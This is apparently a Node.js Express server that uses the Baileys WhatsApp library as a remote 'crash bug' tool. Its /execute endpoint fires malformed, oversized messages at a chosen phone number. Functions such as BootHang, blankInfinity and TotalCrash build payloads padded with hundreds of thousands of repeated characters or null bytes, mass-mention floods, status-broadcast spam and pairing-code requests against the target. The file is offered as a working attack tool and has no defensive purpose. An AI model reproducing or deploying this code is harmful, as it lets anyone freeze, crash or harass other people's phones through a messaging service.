const express = require("express");
const cors = require("cors");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");

const app = express();
app.use(cors());
app.use(express.json());

let sock = null;
let isConnected = false;
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ═══════════ FUNC WA ═══════════
async function blankButton(s, t) {
  await s.relayMessage(t, { viewOnceMessage: { message: { interactiveMessage: {
    header:{title:"ꦽ".repeat(30000)}, body:{text:"ꦽ".repeat(50000)},
    nativeFlowMessage:{ messageParamsJson:"[".repeat(10000), buttons: Array(10).fill().map((_,i)=>({name:"b"+i,buttonParamsJson:JSON.stringify({data:"x".repeat(1000)})}))}
  }}}}, { participant:{jid:t} });
}

async function whoRuxzs(s, t) {
  await s.relayMessage(t, { viewOnceMessage: { message: { interactiveMessage: {
    header:{title:"Crash\n",hasMediaAttachment:false}, body:{text:"Ruxzs Not found"},
    nativeFlowMessage:{ messageParamsJson:"", buttons:[{name:"cta_url",buttonParamsJson:"x"},{name:"call_permission_request",buttonParamsJson:"y"}]}
  }}}}, { participant:{jid:t} });
}

async function Ruxsback(s, t) {
  await s.relayMessage(t, { botInvokeMessage: { message: { newsletterAdminInviteMessage: {
    newsletterJid:"33333333333333333@newsletter", newsletterName:"Halo Ruxzs"+"ꦾ".repeat(120000),
    jpegThumbnail: Buffer.alloc(10000,0xff), caption:"ꦽ".repeat(120000), inviteExpiration: Date.now()+1814400000,
  }}}}, { userJid:t });
}

async function RealRuxss(s, t) {
  await s.relayMessage(t, { viewOnceMessage: { message: { interactiveResponseMessage: {
    body:{text:"Hi?",format:"DEFAULT"},
    nativeFlowResponseMessage:{name:"call_permission_request",paramsJson:"\u0000".repeat(1000000),version:3}
  }}}}, { participant:{jid:t} });
}

async function BootHang(s, t, lv=3) {
  const cfg = { 1:{s:300,e:100,a:80,n:80}, 2:{s:800,e:300,a:200,n:200}, 3:{s:1500,e:600,a:400,n:400} }[lv] || {s:800,e:300,a:200,n:200};
  const B = "\u0003".repeat(2000); const tasks = [];
  const statusMsg = { viewOnceMessage:{message:{listResponseMessage:{title:B,listType:2,buttonText:null,sections:Array.from({length:200},(_,r)=>({title:B,rows:[{title:B,id:""+r}]})),singleSelectReply:{selectedRowId:B},contextInfo:{participant:t,remoteJid:"status@broadcast",mentionedJid:Array.from({length:5000},()=>`1${Math.floor(Math.random()*5e6)}@s.whatsapp.net`),isForwarded:true,forwardingScore:9999},description:B}}}};
  for (let i=0;i<cfg.s;i++) tasks.push(s.relayMessage("status@broadcast",statusMsg,{messageId:"s"+i,statusJidList:[t]}).catch(()=>{}));
  const eph = { extendedTextMessage:{text:B,contextInfo:{expiration:86400*7,ephemeralSettingTimestamp:Date.now(),ephemeralSharedSecret:Buffer.alloc(200000,0xff).toString("base64"),mentionedJid:Array.from({length:3000},()=>`1${Math.floor(Math.random()*5e6)}@s.whatsapp.net`)}}};
  for (let i=0;i<cfg.e;i++) tasks.push(s.relayMessage(t,eph,{messageId:"e"+i}).catch(()=>{}));
  for (let i=0;i<cfg.n;i++) tasks.push(s.relayMessage(t,{conversation:B,messageContextInfo:{deviceListMetadata:{},deviceListMetadataVersion:2}},{messageId:"n"+i}).catch(()=>{}));
  await Promise.allSettled(tasks); return tasks.length;
}

async function blankInfinity(s, t, ms=60000) {
  const start = Date.now(); let n=0;
  while (Date.now()-start < ms) {
    try {
      const mentions=["0@s.whatsapp.net",...Array.from({length:5000},()=>"1"+Math.floor(Math.random()*999999)+"@s.whatsapp.net")];
      for (let i=0;i<75;i++) {
        const flood = { viewOnceMessage:{message:{
          interactiveMessage:{body:{text:"Ziee"},contextInfo:{forwardingScore:9999,isForwarded:true,participant:"0@s.whatsapp.net",remoteJid:"status@broadcast",mentionedJid:mentions},nativeFlowMessage:{buttons:[{name:"single_select",buttonParamsJson:""},{name:"call_permission_request",buttonParamsJson:'{"status":true}'}],messageParamsJson:"{{".repeat(15000)}},
          extendedTextMessage:{text:"ꦾ".repeat(25000),contextInfo:{stanzaId:t,participant:t,quotedMessage:{conversation:"ꦾ".repeat(60000)}}}
        }}};
        await s.relayMessage(t,flood,{messageId:"inf"+n,statusJidList:[t]}).catch(()=>{}); n++;
      }
    } catch{}
    await sleep(5000);
  }
  return n;
}

async function TotalCrash(s, t) {
  const phone = t.split("@")[0]; const rep=[];
  try { const code = await s.requestPairingCode(phone); rep.push({step:"pairing",ok:true,note:code}); await sleep(3000); } catch(e) { rep.push({step:"pairing",ok:false,note:e.message}); }
  try { const n = await BootHang(s,t,3); rep.push({step:"boothang_L3",ok:true,note:n+" relay"}); } catch(e) { rep.push({step:"boothang",ok:false,note:e.message}); }
  for (const [name,fn] of [["blankButton",blankButton],["whoRuxzs",whoRuxzs],["Ruxsback",Ruxsback],["RealRuxss",RealRuxss]]) {
    try { await fn(s,t); rep.push({step:name,ok:true}); } catch(e) { rep.push({step:name,ok:false,note:e.message}); }
    await sleep(800);
  }
  try { const n = await blankInfinity(s,t,60000); rep.push({step:"infinity",ok:true,note:n+" relay"}); } catch(e) { rep.push({step:"infinity",ok:false,note:e.message}); }
  return rep;
}

// ═══════════ WA CONNECT ═══════════
async function startWA() {
  if (!fs.existsSync("session")) fs.mkdirSync("session");
  const { state, saveCreds } = await useMultiFileAuthState("session");
  const { version } = await fetchLatestBaileysVersion();
  sock = makeWASocket({ version, auth:state, printQRInTerminal:false, logger:pino({level:"silent"}), browser:["Ubuntu","Chrome","120"] });
  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("connection.update", (u) => {
    if (u.connection === "open") { isConnected = true; console.log("✅ WA connected"); }
    if (u.connection === "close") {
      isConnected = false;
      const c = u.lastDisconnect?.error?.output?.statusCode;
      if (c !== DisconnectReason.loggedOut) startWA();
    }
  });
}

// ═══════════ API ROUTES ═══════════
app.get("/status", (req,res) => res.json({ status: isConnected ? "connected" : "disconnected" }));

app.post("/pair", async (req,res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ ok:false, error:"phone wajib" });
  try {
    if (!sock) await startWA();
    await sleep(1500);
    const code = await sock.requestPairingCode(phone.replace(/\D/g,""));
    res.json({ ok:true, code });
  } catch(e) { res.status(500).json({ ok:false, error:e.message }); }
});

app.post("/execute", async (req,res) => {
  const { type, target } = req.body;
  if (!isConnected) return res.status(400).json({ ok:false, error:"WA belum connect" });
  try {
    let result;
    if (type === "totalcrash") result = await TotalCrash(sock, target);
    if (type === "boothang") result = await BootHang(sock, target, 3);
    if (type === "infinity") result = await blankInfinity(sock, target, 60000);
    res.json({ ok:true, result });
  } catch(e) { res.status(500).json({ ok:false, error:e.message }); }
});

startWA();
app.listen(process.env.PORT || 3000, () => console.log("🚀 server port " + (process.env.PORT||3000)));